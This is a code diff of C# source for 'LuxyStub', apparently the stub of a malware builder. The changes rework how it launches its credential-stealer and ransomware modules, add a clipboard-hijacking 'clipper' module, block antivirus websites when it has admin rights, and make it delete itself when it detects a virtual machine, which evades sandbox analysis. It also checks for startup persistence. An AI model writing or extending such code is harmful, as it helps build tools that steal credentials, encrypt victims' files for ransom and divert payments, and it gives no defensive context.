@@ -22,28 +22,29 @@ namespace LuxyStub
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
-            Thread ProcessThread = new Thread(() => AProcess());
-            ProcessThread.Start();
+            Task.WaitAll(Process());
 
             Thread BlockAvSitesThread = new Thread(() => BlockAvSites());
             if (Settings.BlockAvSites && Syscalls.CheckAdminPrivileges()) BlockAvSitesThread.Start();
 
             if (Settings.StealerModule)
             {
-                Thread StealerThread = new Thread(() => Modules.Stealer.Stealer.Start());
+                Thread StealerThread = new Thread(Modules.Stealer.Stealer.Start);
                 StealerThread.Start();
+                StealerThread.Join();
             }
 
             if (Settings.RansomewareModule)
             {
-                Thread RansomwareThread = new Thread(() => Modules.Ransomware.Ransomeware.Start());
+                Thread RansomwareThread = new Thread(Modules.Ransomware.Ransomeware.Start);
                 RansomwareThread.Start();
+                RansomwareThread.Join();
             }
-        }
 
-        static private async void AProcess()
-        {
-            Task.WaitAll(Process());
+            if (Settings.ClippperModule)
+            {
+                Modules.Clipper.Clipper.Start();
+            }
         }
 
         static private async Task Process()
@@ -53,8 +54,11 @@ namespace LuxyStub
             while (!await Common.IsConnectionAvailable())
                 Thread.Sleep(60000); // Connection available. Retry every 1 min.
 
-            if (Settings.AntiVm &&
-                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.
+            if (Settings.AntiVm && Detector.IsVirtualMachine())
+            {
+                Console.WriteLine("Is VM");
+                Common.SelfDelete(2); // Self-Delete if virtual machine is detected.
+            }
 
             if (!Common.IsInStartup())
             {
